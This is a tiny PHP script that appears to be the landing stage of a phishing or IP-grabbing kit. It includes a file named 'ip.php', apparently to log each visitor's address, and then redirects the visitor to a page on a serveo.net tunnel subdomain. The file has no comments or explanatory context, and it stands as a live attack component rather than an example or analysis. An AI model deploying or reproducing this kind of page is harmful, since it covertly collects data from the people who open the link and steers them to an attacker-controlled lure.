<?php
include 'ip.php';
header('Location: https://pulsakouta.serveo.net/true.html');
exit
?>
